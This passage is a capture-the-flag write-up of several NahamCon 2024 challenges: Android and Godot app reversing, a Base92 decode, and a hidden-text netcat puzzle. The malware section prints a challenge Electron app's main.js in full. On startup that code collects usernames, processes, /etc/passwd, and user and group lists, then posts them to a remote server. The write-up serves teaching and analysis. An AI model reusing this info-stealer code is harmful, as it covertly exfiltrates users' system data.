I then used Android Studio on a Windows machine, an IDE for building Android applications, to run the APK file in the emulator and activated the log console.

I tap the screen on the emulator and the console wrote:

```2024-05-24 21:23:28.549  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  Listening for taps...
2024-05-24 21:23:28.553  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  Screen tapped!
2024-05-24 21:23:28.554  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  Displaying bang photo...
2024-05-24 21:23:28.559  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  Playing bang sound...
2024-05-24 21:23:28.823  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  BANG!
2024-05-24 21:23:28.824  3308-3308  kitty kitty bang bang   com.nahamcon2024.kittykittybangbang  I  flag{f9028245dd46eedbf9b4f8861d73ae0f}
```

`flag{f9028245dd46eedbf9b4f8861d73ae0f}`

---
## Perfectly Legit Crypto Casino
Author: @alden
Category: Malware

**I'm just finding out about this blockchain thing and it's awesome! I can gamble all I want with no consequences! Checkout my new favorite app!**

In this challenge you are given an `Diamond Hand's Crypto Casino.zip` when you unzip the file, you get `Diamond Hand's Crypto Casino.app`, which is a directory you can explore.

In the `/Resources/Contents` directory, I found an `app.asar` file. An ASAR file is an archive used by Electron, a framework for building cross-platform desktop applications with web technologies like JavaScript, HTML, and CSS, to package application resources.

I unpacked the ASAR file using the command `npx @electron/asar extract app.asar unpacked`, which created an unpacked folder containing the following contents. I used the command `tree` to get an overview of the directory structure.

```
unpacked
├── forge.config.js
├── icon.icns
├── index.html
├── main.js
├── node_modules
│   ├── asynckit
│   │   ├── bench.js
│   │   ├── index.js
│   │   ├── lib
│   │   │   ├── abort.js
│   │   │   ├── async.js
│   │   │   ├── defer.js
│   │   │   ├── iterate.js
│   │   │   ├── readable_asynckit.js
│   │   │   ├── readable_parallel.js
│   │   │   ├── readable_serial.js
│   │   │   ├── readable_serial_ordered.js
│   │   │   ├── state.js
│   │   │   ├── streamify.js
│   │   │   └── terminator.js
│   │   ├── LICENSE
│   │   ├── package.json
│   │   ├── parallel.js
│   │   ├── README.md
│   │   ├── serial.js
│   │   ├── serialOrdered.js
│   │   └── stream.js
│   ├── axios
│   │   ├── CHANGELOG.md
│   │   ├── dist
│   │   │   ├── axios.js
│   │   │   ├── axios.js.map
│   │   │   ├── axios.min.js
│   │   │   ├── axios.min.js.map
│   │   │   ├── browser
│   │   │   │   ├── axios.cjs
│   │   │   │   └── axios.cjs.map
│   │   │   ├── esm
│   │   │   │   ├── axios.js
│   │   │   │   ├── axios.js.map
│   │   │   │   ├── axios.min.js
│   │   │   │   └── axios.min.js.map
│   │   │   └── node
│   │   │       ├── axios.cjs
│   │   │       └── axios.cjs.map
│   │   ├── index.d.cts
│   │   ├── index.d.ts
│   │   ├── index.js
│   │   ├── lib
│   │   │   ├── adapters
│   │   │   │   ├── adapters.js
│   │   │   │   ├── fetch.js
│   │   │   │   ├── http.js
│   │   │   │   ├── README.md
│   │   │   │   └── xhr.js
│   │   │   ├── axios.js
│   │   │   ├── cancel
│   │   │   │   ├── CanceledError.js
│   │   │   │   ├── CancelToken.js
│   │   │   │   └── isCancel.js
│   │   │   ├── core
│   │   │   │   ├── AxiosError.js
│   │   │   │   ├── AxiosHeaders.js
│   │   │   │   ├── Axios.js
│   │   │   │   ├── buildFullPath.js
│   │   │   │   ├── dispatchRequest.js
│   │   │   │   ├── InterceptorManager.js
│   │   │   │   ├── mergeConfig.js
│   │   │   │   ├── README.md
│   │   │   │   ├── settle.js
│   │   │   │   └── transformData.js
│   │   │   ├── defaults
│   │   │   │   ├── index.js
│   │   │   │   └── transitional.js
│   │   │   ├── env
│   │   │   │   ├── classes
│   │   │   │   │   └── FormData.js
│   │   │   │   ├── data.js
│   │   │   │   └── README.md
│   │   │   ├── helpers
│   │   │   │   ├── AxiosTransformStream.js
│   │   │   │   ├── AxiosURLSearchParams.js
│   │   │   │   ├── bind.js
│   │   │   │   ├── buildURL.js
│   │   │   │   ├── callbackify.js
│   │   │   │   ├── combineURLs.js
│   │   │   │   ├── composeSignals.js
│   │   │   │   ├── cookies.js
│   │   │   │   ├── deprecatedMethod.js
│   │   │   │   ├── formDataToJSON.js
│   │   │   │   ├── formDataToStream.js
│   │   │   │   ├── fromDataURI.js
│   │   │   │   ├── HttpStatusCode.js
│   │   │   │   ├── isAbsoluteURL.js
│   │   │   │   ├── isAxiosError.js
│   │   │   │   ├── isURLSameOrigin.js
│   │   │   │   ├── null.js
│   │   │   │   ├── parseHeaders.js
│   │   │   │   ├── parseProtocol.js
│   │   │   │   ├── progressEventReducer.js
│   │   │   │   ├── readBlob.js
│   │   │   │   ├── README.md
│   │   │   │   ├── resolveConfig.js
│   │   │   │   ├── speedometer.js
│   │   │   │   ├── spread.js
│   │   │   │   ├── throttle.js
│   │   │   │   ├── toFormData.js
│   │   │   │   ├── toURLEncodedForm.js
│   │   │   │   ├── trackStream.js
│   │   │   │   ├── validator.js
│   │   │   │   └── ZlibHeaderTransformStream.js
│   │   │   ├── platform
│   │   │   │   ├── browser
│   │   │   │   │   ├── classes
│   │   │   │   │   │   ├── Blob.js
│   │   │   │   │   │   ├── FormData.js
│   │   │   │   │   │   └── URLSearchParams.js
│   │   │   │   │   └── index.js
│   │   │   │   ├── common
│   │   │   │   │   └── utils.js
│   │   │   │   ├── index.js
│   │   │   │   └── node
│   │   │   │       ├── classes
│   │   │   │       │   ├── FormData.js
│   │   │   │       │   └── URLSearchParams.js
│   │   │   │       └── index.js
│   │   │   └── utils.js
│   │   ├── LICENSE
│   │   ├── MIGRATION_GUIDE.md
│   │   ├── package.json
│   │   ├── README.md
│   │   └── SECURITY.md
│   ├── combined-stream
│   │   ├── lib
│   │   │   └── combined_stream.js
│   │   ├── License
│   │   ├── package.json
│   │   └── Readme.md
│   ├── delayed-stream
│   │   ├── lib
│   │   │   └── delayed_stream.js
│   │   ├── License
│   │   ├── Makefile
│   │   ├── package.json
│   │   └── Readme.md
│   ├── @electron
│   ├── @electron-forge
│   ├── electron-squirrel-startup
│   │   ├── appveyor.yml
│   │   ├── index.js
│   │   ├── LICENSE
│   │   ├── node_modules
│   │   │   ├── debug
│   │   │   │   ├── CHANGELOG.md
│   │   │   │   ├── component.json
│   │   │   │   ├── karma.conf.js
│   │   │   │   ├── LICENSE
│   │   │   │   ├── Makefile
│   │   │   │   ├── node.js
│   │   │   │   ├── package.json
│   │   │   │   ├── README.md
│   │   │   │   └── src
│   │   │   │       ├── browser.js
│   │   │   │       ├── debug.js
│   │   │   │       ├── index.js
│   │   │   │       ├── inspector-log.js
│   │   │   │       └── node.js
│   │   │   └── ms
│   │   │       ├── index.js
│   │   │       ├── license.md
│   │   │       ├── package.json
│   │   │       └── readme.md
│   │   ├── package.json
│   │   ├── README.md
│   │   └── test
│   │       └── index.test.js
│   ├── follow-redirects
│   │   ├── debug.js
│   │   ├── http.js
│   │   ├── https.js
│   │   ├── index.js
│   │   ├── LICENSE
│   │   ├── package.json
│   │   └── README.md
│   ├── form-data
│   │   ├── index.d.ts
│   │   ├── lib
│   │   │   ├── browser.js
│   │   │   ├── form_data.js
│   │   │   └── populate.js
│   │   ├── License
│   │   ├── package.json
│   │   ├── Readme.md
│   │   └── README.md.bak
│   ├── @gar
│   ├── @malept
│   ├── mime-db
│   │   ├── db.json
│   │   ├── HISTORY.md
│   │   ├── index.js
│   │   ├── LICENSE
│   │   ├── package.json
│   │   └── README.md
│   ├── mime-types
│   │   ├── HISTORY.md
│   │   ├── index.js
│   │   ├── LICENSE
│   │   ├── package.json
│   │   └── README.md
│   ├── @nodelib
│   ├── @npmcli
│   ├── proxy-from-env
│   │   ├── index.js
│   │   ├── LICENSE
│   │   ├── package.json
│   │   ├── README.md
│   │   └── test.js
│   ├── @sindresorhus
│   ├── @szmarczak
│   ├── @tootallnate
│   ├── @types
│   └── @xmldom
├── package.json
├── prod.js
├── renderer.js
└── style.css

```

I looked through a couple of file but usually the `main.js` is a file that is interesting for us. This one contains some "malware" that gathers OS information and sends it to a remote server.

```javascript
const { app, BrowserWindow } = require("electron");
const path = require("path");
const { exec } = require("child_process");
const os = require("os");
const axios = require("axios");

function start() {
  const system = os.platform();
  switch (system) {
    case "darwin":
      return runMacOS();
    case "win32":
      return runWindows();
    case "linux":
      return runLinux();
    default:
      return "Unsupported OS";
  }
}

function doCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        resolve(error.message);
        return;
      }
      if (stderr) {
        resolve(stderr);
        return;
      }
      resolve(stdout.trim());
    });
  });
}

async function gatherSystemInfo(commands) {
  const results = await Promise.all(
    commands.map(([key, cmd]) => doCommand(cmd).then((output) => [key, output]))
  );
  return results.reduce((info, [key, output]) => {
    info[key] = output;
    return info;
  }, {});
}

async function runMacOS() {
  doCommand(
    "echo U2FsdGVkX18dLoy5VJmru0jW8cEVgMQS5JYhHSk8D369laaZ7d7nBJXslDqS4CFoqIfwoKGM6Urhmx079RXgIA== | openssl enc -aes-256-cbc -d -a -pass pass:infected"
  );
  const commands = [
    ["username", "whoami"],
    ["hostname", "hostname"],
    ["ip", "hostname"],
    ["osys", "sw_vers -productVersion"],
    ["cpu", "sysctl -n machdep.cpu.brand_string"],
    ["ram", "sysctl -n hw.memsize"],
    ["gpu", "system_profiler SPDisplaysDataType | grep Chipset"],
    ["disk", "diskutil info / | grep Total"],
    ["network", "networksetup -listallhardwareports"],
    ["uptime", "uptime"],
    ["processes", "ps aux"],
    ["services", "launchctl list"],
    [
      "firewall",
      "defaults read /Library/Preferences/com.apple.alf globalstate",
    ],
    ["users", "dscl . list /Users"],
    ["groups", "dscl . list /Groups"],
  ];
  const info = await gatherSystemInfo(commands);
  sendToServer(info);
}

async function runWindows() {
  const commands = [
    ["username", "whoami"],
    ["hostname", "hostname"],
    ["ip", "ipconfig"],
    ["osys", 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'],
    ["cpu", "wmic cpu get caption"],
    ["ram", "wmic memorychip get capacity"],
    ["gpu", "wmic path win32_videocontroller get caption"],
    ["disk", "wmic diskdrive get caption,size"],
    ["network", "wmic nic get name"],
    ["uptime", 'systeminfo | findstr /B /C:"System Boot Time"'],
    ["processes", "tasklist"],
    ["services", "net start"],
    ["firewall", "netsh advfirewall show allprofiles state"],
    ["users", "net user"],
    ["groups", "net localgroup"],
  ];
  const info = await gatherSystemInfo(commands);
  sendToServer(info);
}

async function runLinux() {
  const commands = [
    ["username", "whoami"],
    ["hostname", "hostname"],
    ["ip", "hostname -I"],
    ["osys", "cat /etc/*-release"],
    ["cpu", "lscpu"],
    ["ram", "free -h"],
    ["gpu", "lspci | grep VGA"],
    ["disk", "lsblk"],
    ["network", "ip link show"],
    ["uptime", "uptime"],
    ["processes", "ps aux"],
    ["services", "systemctl list-units --type=service"],
    ["firewall", "ufw status"],
    ["users", "cat /etc/passwd"],
    ["groups", "cat /etc/group"],
  ];
  const info = await gatherSystemInfo(commands);
  sendToServer(info);
}

function sendToServer(data) {
  axios
    .post("http://nicesandbox.com/systeminfo", data)
    .then((response) => {
      console.log("Data sent successfully:", response.data);
    })
    .catch((error) => {
      console.error("Error sending data:", error);
    });
}

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "renderer.js"),
    },
  });
  start();
  win.loadFile("index.html");
}

app.whenReady().then(createWindow);

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});

app.on("activate", () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

```

In the `main.js` I found the following command that caught my attention.
```java
async function runMacOS() {
  doCommand(
    "echo U2FsdGVkX18dLoy5VJmru0jW8cEVgMQS5JYhHSk8D369laaZ7d7nBJXslDqS4CFoqIfwoKGM6Urhmx079RXgIA== | openssl enc -aes-256-cbc -d -a -pass pass:infected"
  );
```

This looked like it could be some sort of flag, as there was nothing else in `main.js` that seemed interesting.

```shell
──(kali㉿kali)-[~/nahamcon/perfectlylegitcryptocasino]
└─$ echo U2FsdGVkX18dLoy5VJmru0jW8cEVgMQS5JYhHSk8D369laaZ7d7nBJXslDqS4CFoqIfwoKGM6Urhmx079RXgIA== | openssl enc -aes-256-cbc -d -a -pass pass:infected 
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
flag{6d0560223d733e5a6761476f8d23b4e3}
```

`flag{6d0560223d733e5a6761476f8d23b4e3}`

---
## That's not my Base
Author: @JohnHammond
Category: Warmups

**Everyone knows about Base64, but do you know about this one?**

***(Remember, the flag format starts with flag{!)***

`F#S<YRXdP0Fd=,%J4c$Ph7XV(gF/*]%C4B<qlH+%3xGHo)\`

First, I visited https://cyberchef.io and tried various `from base` operations on the string to see if I could decode it. Unfortunately, I wasn't successful, so I turned to Google to find a tool that could assist me.

I discovered a tool on GitHub, https://github.com/mufeedvh/basecrack, which helped me decode the string.

```
┌──(kali㉿kali)-[~/tools/basecrack]
└─$ python3 basecrack.py                                                   

██████╗  █████╗ ███████╗███████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗                   
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝                    
██████╔╝███████║███████╗█████╗  ██║     ██████╔╝███████║██║     █████╔╝                      
██╔══██╗██╔══██║╚════██║██╔══╝  ██║     ██╔══██╗██╔══██║██║     ██╔═██╗                      
██████╔╝██║  ██║███████║███████╗╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗                     
╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ v4.0                                                         
                                                                                                                                      
                python basecrack.py -h [FOR HELP]                                                                                     
                                                                                                                                      
[>] Enter Encoded Base: F#S<YRXdP0Fd=,%J4c$Ph7XV(gF/*]%C4B<qlH+%3xGHo)\ 

[>] Decoding as Base92: flag{784454a9509196a33dba242c423c057a}                                                                        

[-] The Encoding Scheme Is Base92  
```

`flag{784454a9509196a33dba242c423c057a}`

---
## Copypasta
Author: @JohnHammond#6971

**You know those funny Internet messages that everybody likes to copy and paste? Yeah....**  
  
**Turns out they make a good Warmups CTF challenge, too!**

For this challenge we need to connect with nc through a terminal:

```
┌──(kali㉿kali)-[~/nahamcon/copypasta]
└─$ nc challenge.nahamcon.com 31476
                                                                                
I'd just like to interject for a moment. What you're referring to as Linux, is  
in fact, GNU/Linux, or as I've recently taken to calling it, GNU plus Linux.                                                          
Linux is not an operating system unto itself, but rather another free component                                                       
of a fully functioning GNU system made useful by the GNU corelibs, shell                                                              
utilities and vital system components comprising a full OS as defined by POSIX.                                                       
                                                                                                                                      
Many computer users run a modified version of the GNU system every day, without                                                       
realizing it. Through a peculiar turn of events, the version of GNU which is                                                          
widely used today is often called Linux, and many of its users are not aware                                                          
that it is basically the GNU system, developed by the GNU Project.                                                                    
                                          
There really is a Linux, and these people are using it, but it is just a part of
the system they use. Linux is the kernel: the program in the system that                                                              
allocates the machine's resources to the other programs that you run. The kernel                                                      
is an essential part of an operating system, but useless by itself; it can only                                                       
function in the context of a complete operating system. Linux is normally used                                                        
in combination with the GNU operating system: the whole system is basically GNU                                                       
with Linux added, or GNU/Linux. All the so-called Linux distributions are really                                                      
distributions of GNU/Linux!                                                                                                           
                                                                                
                                                                                                                                      

```

When you look at this on the terminal there are no indications of anything beside the description that mentions the copy paste function.

When you copy paste it into a text editor like Sublime you see the output like this.

```text

                                                                                
I'd just like to interject for a moment. What you're referring to as Linux, is  
in fact, GNU/Linux, or as I've recently taken to calling it, GNU plus Linux.                                                          
Linux is not an operating system unto itself, but rather another free component                                                       
of a fully functioning GNU system made useful by the GNU corelibs, shell                                                              
utilities and vital system components comprising a full OS as defined by POSIX.                                                       
                                                                                                                                      
Many computer users run a modified version of the GNU system every day, without                                                       
realizing it. Through a peculiar turn of events, the version of GNU which is                                                          
widely used today is often called Linux, and many of its users are not aware                                                          
that it is basically the GNU system, developed by the GNU Project.                                                                    
                                          flag{1f68e019b29650f6e8ea15a7808f76fd}
There really is a Linux, and these people are using it, but it is just a part of
the system they use. Linux is the kernel: the program in the system that                                                              
allocates the machine's resources to the other programs that you run. The kernel                                                      
is an essential part of an operating system, but useless by itself; it can only                                                       
function in the context of a complete operating system. Linux is normally used                                                        
in combination with the GNU operating system: the whole system is basically GNU                                                       
with Linux added, or GNU/Linux. All the so-called Linux distributions are really                                                      
distributions of GNU/Linux!                                                                                                           
                                                                                
                                                                                                                                      
```

`flag{1f68e019b29650f6e8ea15a7808f76fd}`

---
## Buggy Jumper 1
Author: @matlac
Category: Mobile

**Buggy Jumper is a new mobile game that can be enjoyable for both gamers and hackers! There's a lot going on, can you get some of game's source code to see whats happening behind the scenes?**

In this challenge we were provided with an APK file named `com.nahacon2024.buggyjumper.apk`. As a noob in mobile reverse engineering, navigating through this file proved to be quite the challenge.

Initially, I attempted to analyze the APK by importing it into Android Studio, hoping to gain some insights from its structure. However, this yielded no useful information. I proceeded to decompile the APK using the online tool available at https://www.decompiler.com. It was during this process that I stumbled upon a file of interest: `com.nahamcon2024.buggyjumper.apk/resources/assets/scripts/flag.gdc`.

I downloaded and located `flag.gdc` which assured me I was on the right track.

```text
┌──(kali㉿kali)-[~/Downloads/resources/assets/scripts]
└─$ cat flag.gdc
���Ӷ���(�����Մ׆Տ��ӏ�����׀���������鶶��Ѷ���Oreplace the underscores in the function name with curly braces when submitting!
3YYY0�PQV�;�Y`  
```

Next up I needed to decrypt the `gdc` file. Switching to my Windows machine, I downloaded the necessary tool, "Godot RE Tools," from https://github.com/bruvzg/gdsdecomp. With this tool, I successfully decompiled the file, resulting in a readable `flag.gc`:

The output from the tool is a `flag.gc` that can be read by any texteditor.

```
extends Node


func flag_c2d5a0c9cae9857a3cfa662cd2869835_():
    var flag = "replace the underscores in the function name with curly braces when submitting!"

```

`flag{c2d5a0c9cae9857a3cfa662cd2869835}`